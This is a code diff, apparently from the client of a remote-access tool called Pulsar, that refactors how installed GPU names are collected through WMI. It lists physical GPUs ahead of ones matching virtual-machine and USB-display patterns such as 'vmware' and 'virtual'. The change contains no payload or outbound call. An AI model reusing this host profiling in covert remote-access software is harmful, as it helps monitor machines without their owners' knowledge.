@@ -1,6 +1,7 @@
 ﻿using Pulsar.Common.Cryptography;
 using Pulsar.Common.Helpers;
 using System;
+using System.Collections.Generic;
 using System.Linq;
 using System.Management;
 using System.Net.NetworkInformation;
@@ -206,7 +207,7 @@ namespace Pulsar.Client.IO
         {
             try
             {
-                string gpuNames = string.Empty;
+                List<string> gpus = new List<string>();
                 string query = "SELECT * FROM Win32_VideoController";
 
                 using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
@@ -215,21 +216,36 @@ namespace Pulsar.Client.IO
                     {
                         if (mObject["Name"] != null)
                         {
-                            gpuNames += mObject["Name"].ToString() + "; ";
+                            gpus.Add(mObject["Name"].ToString());
                         }
                     }
                 }
 
-                gpuNames = gpuNames.TrimEnd(new char[] { ';', ' ' });
+                if (gpus.Count == 0) return "N/A";
 
-                return (!string.IsNullOrEmpty(gpuNames)) ? gpuNames : "N/A";
+                // Separate virtual GPUs (common patterns) from physical ones
+                List<string> virtualGpus = gpus.Where(name =>
+                    name.ToLower().Contains("microsoft basic") ||
+                    name.ToLower().Contains("vmware") ||
+                    name.ToLower().Contains("virtual") ||
+                    name.ToLower().Contains("usb") ||      // for USB monitors
+                    name.ToLower().Contains("displaylink") // common USB/virtual display driver
+                ).ToList();
+
+                List<string> physicalGpus = gpus.Except(virtualGpus).ToList();
+
+                // Return physical first, then virtual
+                List<string> orderedGpus = new List<string>();
+                orderedGpus.AddRange(physicalGpus);
+                orderedGpus.AddRange(virtualGpus);
+
+                return string.Join("; ", orderedGpus);
             }
             catch
             {
                 return "Unknown";
             }
         }
-
         private static string GetLanIpAddress()
         {
             // TODO: support multiple network interfaces
